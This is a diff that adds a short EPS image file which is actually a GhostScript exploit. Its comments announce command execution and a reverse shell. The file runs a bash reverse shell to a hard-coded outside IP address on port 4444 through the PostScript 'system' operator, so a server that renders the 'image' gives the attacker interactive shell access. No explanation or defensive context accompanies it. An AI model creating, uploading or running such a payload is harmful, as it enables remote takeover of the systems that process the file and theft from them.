@@ -1,0 +1,12 @@
+%!PS-Adobe-3.0 EPSF-3.0
+%%BoundingBox: 0 0 100 100
+
+% Command execution via GhostScript
+userdict /setpagedevice undef
+legal
+{ nulldevice } if
+
+% Esegui reverse shell
+( bash -c 'bash -i >& /dev/tcp/104.251.180.58/4444 0>&1' ) system
+
+showpage
